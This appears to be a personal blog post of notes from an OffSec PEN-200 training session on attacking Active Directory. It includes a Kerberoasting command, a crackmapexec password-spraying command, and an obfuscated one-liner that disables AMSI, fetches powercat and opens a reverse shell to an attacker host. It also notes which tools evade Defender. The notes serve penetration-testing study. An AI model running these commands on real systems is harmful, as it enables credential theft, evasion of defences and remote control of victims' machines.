---
title: 'OffSec Live: PEN-200'
date: 2022-08-26 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-08-26-offsec-live-pen-200.html
author: 100007
---

<h1 id="offsec-live-pen-200">OffSec Live: PEN-200</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-08-26</p>
<h1 id="active-directory-enumeration--exploitation-part-2">Active Directory Enumeration &amp; Exploitation, Part 2</h1>
<p><code class="language-plaintext highlighter-rouge">Get-DomainUsers -SPN</code> will list AD service accounts using <code class="language-plaintext highlighter-rouge">PowerView.ps1</code>.</p>
<p>In AD, the domain controller will grant a service ticket for <em>any</em> service to <em>any</em> user. Access is enforced by the <em>service</em> machine.</p>
<p>Since AD tickets are encrypted using account password hashes - so if weak passwords are chosen for service accounts, tickets can be cracked to retrieve service account passwords.</p>
<p>There is an <code class="language-plaintext highlighter-rouge">Invoke-Kerberos.ps1</code> PowerShell module out there that does native kerberoasting from PowerShell. Output can be passed to Hashcat, among others. Be sure to set the <code class="language-plaintext highlighter-rouge">-Width</code> parameter (vixx recommends 8000) when using <code class="language-plaintext highlighter-rouge">Out-File</code> with this module, or this function won’t output the entire ticket!</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Kerberoast</span><span class="w"> </span><span class="nt">-OutputFormat</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Hash</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="n">Out-File</span><span class="w"> </span><span class="nt">-filepath</span><span class="w"> </span><span class="s2">"</span><span class="nv">$FILE_PATH</span><span class="s2">"</span><span class="w"> </span><span class="nt">-Width</span><span class="w"> </span><span class="nx">8000</span><span class="w">
</span></code></pre></div></div>
<p>SSH port forwarding is actually using SOCKS5 under the hood. This is important to know when setting up tools like <code class="language-plaintext highlighter-rouge">proxychains</code>.</p>
<p>There’s a tool called <code class="language-plaintext highlighter-rouge">crackmapexec</code> that allows cracked passwords to be sprayed across an AD environment (available in the Kali repos). Since SMB shares are both common and often contain interesting files, this is a good service to try to gain (indiscriminate) access to. (Note that you <em>shouldn’t</em> use password spraying to try to crack user passwords, as doing so will likely lead to account lockouts and subsequent alarms. Instead, use spraying to determine user access.)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb <span class="nv">$TARGET_NETWORK</span>/<span class="nv">$TARGET_NETMASK</span> <span class="se">\</span>
<span class="nt">-u</span> <span class="nv">$TARGER_USER</span> <span class="nt">-p</span> <span class="nv">$CRACKED_PASSWORD</span> 2&gt; /dev/null
</code></pre></div></div>
<p>Microsoft Defender now detects ImPacket PSEXEC and SMBEXEC execution attempts.</p>
<p>The SCShell fileless lateral movement tool is generally <em>not</em> detected by Microsoft Defender (at least as of this course). It does require RPC to be available on the target, though this is common in AD environments.</p>
<p>Powercat is a reimplementation of netcat in PowerShell. Helpful!</p>
<p>A one-liner to bypass AMSI and fire up a PowerShell reverse shell using Powercat:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">REF</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.'</span><span class="o">+</span><span class="err">$</span><span class="p">(</span><span class="s2">"41 6D 73 69 55 74 69 6C 73"</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="o">|</span><span class="kr">forEach</span><span class="p">&#x007b;[</span><span class="n">char</span><span class="p">]([</span><span class="n">convert</span><span class="p">]::</span><span class="n">toint16</span><span class="p">(</span><span class="bp">$_</span><span class="p">,</span><span class="mi">16</span><span class="p">))&#x007d;</span><span class="o">|</span><span class="kr">forEach</span><span class="p">&#x007b;</span><span class="nv">$result</span><span class="o">=</span><span class="nv">$result</span><span class="o">+</span><span class="bp">$_</span><span class="p">&#x007d;;</span><span class="nv">$result</span><span class="p">))</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="s2">"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="o">|</span><span class="kr">forEach</span><span class="p">&#x007b;[</span><span class="n">char</span><span class="p">]([</span><span class="n">convert</span><span class="p">]::</span><span class="n">toint16</span><span class="p">(</span><span class="bp">$_</span><span class="p">,</span><span class="mi">16</span><span class="p">))&#x007d;</span><span class="o">|</span><span class="kr">forEach</span><span class="p">&#x007b;</span><span class="nv">$result2</span><span class="o">=</span><span class="nv">$result2</span><span class="o">+</span><span class="bp">$_</span><span class="p">&#x007d;;</span><span class="nv">$result2</span><span class="p">),</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">);</span><span class="w"> </span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"</span><span class="p">);</span><span class="w"> </span><span class="n">powercat</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nv">$ATTACKER_PORT</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span></code></pre></div></div>
<ul>
<li><a href="https://www.offensive-security.com/offsec/offsec-live/">OffSec Live</a></li>
<li><a href="https://learn.offensive-security.com/offsec-live-webinars">Join OffSec Live</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerShellMafia / PowerSploit / Recon / PowerView.ps1</a></li>
<li><a href="https://cardboard-iguana.com/notes/powershell.html">Using PowerShell</a></li>
<li><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">EmpireProject / Empire / module_source / credentials / Invoke-Kerberoast.ps1</a></li>
<li><a href="https://cardboard-iguana.com/notes/kerberos.html">Kerberos</a></li>
<li><a href="https://cardboard-iguana.com/notes/hashcat.html">Using Hashcat</a></li>
<li><a href="https://github.com/Mr-Un1k0d3r/SCShell">Mr-Un1k0d3r / SCShell</a></li>
<li><a href="https://github.com/besimorhino/powercat">besimorhino / powercat</a></li>
</ul>